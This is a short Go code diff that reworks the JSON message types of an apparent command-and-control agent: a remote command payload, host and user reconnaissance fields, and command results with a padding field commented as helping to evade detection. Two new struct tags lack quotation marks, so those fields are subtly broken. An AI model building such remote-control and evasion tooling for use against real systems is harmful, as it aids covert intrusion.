@@ -16,22 +16,26 @@ type Base struct {
 //JSON cmd.exe Payload MESSAGE TYPE: CmdPayload
 type CmdPayload struct {
 	Command	   string `json:"executable"`
-	Parameters string `json:"parameters"`
+	Args string `json:"args"`
 	Job	   string `json:"job"`
 }
 
 //JSON System Information Payload
 type SysInfo struct {
+	Platform string `json:platform,omitempty`
+	Architecture string `json:architecture,omitempty`
 	UserName string `json:"username,omitempty"`
 	UserGUID string `json:"userguid,omitempty"`
 	HostName string `json:"hostname,omitempty"`
 	Pid 	 int	`json:"pid,omitempty"`
 }
 
-//JSON Powershell Command Results
-type PSResults struct {
+//JSON Command Results
+type CmdResults struct {
 	Job string `json:"job"`
-	Result string `json:"result"`
+	Stdout string `json:"stdout"`
+	Stderr string `json:"stderr"`
+	Padding string `json:"padding"` //Padding to help evade detection
 }
 
 //JSON Agent Control Commands
